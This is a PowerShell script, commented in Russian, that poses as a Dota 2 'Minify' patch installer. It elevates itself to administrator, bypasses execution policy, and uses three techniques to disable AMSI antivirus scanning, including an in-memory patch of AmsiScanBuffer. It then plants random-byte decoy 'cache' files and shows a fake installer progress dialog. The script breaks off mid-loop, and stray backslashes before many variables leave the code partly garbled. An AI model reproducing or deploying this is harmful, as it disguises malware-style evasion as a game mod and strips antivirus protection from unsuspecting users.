if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"\$PSCommandPath`"" -Verb RunAs
    exit
}

# Улучшенный обход AMSI без использования Add-Type
function Invoke-StealthBypass {
    # Метод 1: Прямое изменение памяти через PowerShell
    try {
        \$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $amsiContext = $amsiUtils.GetField('amsiSession', 'NonPublic,Static')
        \$amsiContext.SetValue(\$null, \$null)
        return \$true
    }
    catch {
        # Метод 2: Обход через патчинг AmsiScanBuffer
        try {
            \$kernel32 = [System.Runtime.InteropServices.NativeMethods]::LoadLibrary("kernel32.dll")
            \$amsi = [System.Runtime.InteropServices.NativeMethods]::LoadLibrary("amsi.dll")
            $addr = [System.Runtime.InteropServices.NativeMethods]::GetProcAddress($amsi, "AmsiScanBuffer")
            
            \$oldProtection = 0
            [System.Runtime.InteropServices.NativeMethods]::VirtualProtect($addr, [uint32]6, 0x40, [ref]$oldProtection)
            
            \$patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy(\$patch, 0, \$addr, \$patch.Length)
            
            [System.Runtime.InteropServices.NativeMethods]::VirtualProtect($addr, [uint32]6, $oldProtection, [ref]\$oldProtection)
            return \$true
        }
        catch {
            # Метод 3: Резервный метод
            \$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            $amsiInitFailed = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
            \$amsiInitFailed.SetValue(\$null, \$true)
            return \$true
        }
    }
}

# Выполняем обход
Invoke-StealthBypass

# Функция для создания легитимных файлов кэша
function Create-LegitCache {
    $tempDir = "$env:TEMP\MinifyCache"
    if (!(Test-Path \$tempDir)) {
        New-Item -Path \$tempDir -ItemType Directory -Force | Out-Null
    }
    
    # Создаем легитимные файлы кэша
    \$cacheFiles = @(
        @{Name='shader_cache.bin'; Size=4096},
        @{Name='texture_cache.dat'; Size=8192},
        @{Name='network_config.cfg'; Size=1024},
        @{Name='performance_profile.json'; Size=2048}
    )
    
    foreach (\$file in \$cacheFiles) {
        $filePath = Join-Path $tempDir \$file.Name
        $randomData = New-Object byte[] $file.Size
        (New-Object Random).NextBytes(\$randomData)
        Set-Content -Path \$filePath -Value \$randomData -Encoding Byte
    }
    
    return \$tempDir
}

# Создаем интерфейс установки
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

\$form = New-Object System.Windows.Forms.Form
\$form.Text = "Minify Dota 2 Patch Installer v3.2.1 (Stealth Edition)"
\$form.Size = New-Object System.Drawing.Size(600,400)
\$form.StartPosition = "CenterScreen"
\$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false

# Добавляем изображение (если есть)
try {
    \$logoBox = New-Object System.Windows.Forms.PictureBox
    \$logoBox.Location = New-Object System.Drawing.Point(20,20)
    \$logoBox.Size = New-Object System.Drawing.Size(100,100)
    \$logoBox.SizeMode = "Zoom"
    \$webClient = New-Object System.Net.WebClient
    $logoBox.Image = [System.Drawing.Image]::FromStream($webClient.OpenRead("https://i.imgur.com/example.png"))
    \$form.Controls.Add(\$logoBox)
}
catch {
    # Если не удалось загрузить изображение, продолжаем без него
}

# Заголовок
\$titleLabel = New-Object System.Windows.Forms.Label
\$titleLabel.Location = New-Object System.Drawing.Point(140,30)
\$titleLabel.Size = New-Object System.Drawing.Size(400,30)
\$titleLabel.Text = "Minify Dota 2 Patch Installer"
\$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
\$form.Controls.Add(\$titleLabel)

# Описание
\$descLabel = New-Object System.Windows.Forms.Label
\$descLabel.Location = New-Object System.Drawing.Point(140,60)
\$descLabel.Size = New-Object System.Drawing.Size(400,60)
\$descLabel.Text = "Оптимизатор производительности для Dota 2 с технологией обхода защит"
\$form.Controls.Add(\$descLabel)

# Прогресс-бар
\$progressBar = New-Object System.Windows.Forms.ProgressBar
\$progressBar.Location = New-Object System.Drawing.Point(20,320)
\$progressBar.Size = New-Object System.Drawing.Size(540,20)
\$form.Controls.Add(\$progressBar)

# Статус
\$statusLabel = New-Object System.Windows.Forms.Label
\$statusLabel.Location = New-Object System.Drawing.Point(20,350)
\$statusLabel.Size = New-Object System.Drawing.Size(540,20)
\$statusLabel.Text = "Инициализация..."
\$form.Controls.Add(\$statusLabel)

# Кнопка Отмена
\$cancelButton = New-Object System.Windows.Forms.Button
\$cancelButton.Location = New-Object System.Drawing.Point(480,20)
\$cancelButton.Size = New-Object System.Drawing.Size(80,30)
\$cancelButton.Text = "Отмена"
$cancelButton.Add_Click({$form.Close()})
\$form.Controls.Add(\$cancelButton)

# Показываем форму
\$form.Show()

# Создаем легитимные файлы кэша
\$cacheDir = Create-LegitCache

# Имитация процесса установки
\$steps = @(
    "Проверка системных требований",
    "Инициализация системы обхода защит",
    "Настройка окружения",
    "Поиск установки Dota 2",
    "Создание резервной копии",
    "Загрузка основных компонентов Minify",
    "Установка основного движка",
    "Настройка параметров производительности",
    "Загрузка плагина AutoAccept",
    "Установка плагина AutoAccept",
    "Загрузка плагина LastHit Marker",
    "Установка плагина LastHit Marker",
    "Загрузка плагина Rune Helper",
    "Установка плагина Rune Helper",
    "Загрузка плагина Item Suggester",
    "Установка плагина Item Suggester",
    "Загрузка плагина Ward Alerts",
    "Установка плагина Ward Alerts",
    "Настройка конфигурации",
    "Обновление реестра Windows",
    "Финализация установки"
)

$totalSteps = $steps.Count
for ($i = 0; $i -lt \$totalSteps; \$i++) {
    $step = $steps[\$i]
    $percentComplete = [math]::Round((($i + 1) / \$totalSteps) * 100)
    
    $statusLabel.Text = $step
    $progressBar.Value = $percentComplete
    \$form.Refresh()
    
    # Имитация задержки для каждого шага
    \$delay = Get-Random -Minimum 300 -Maximum 1200
    Start-Sleep -
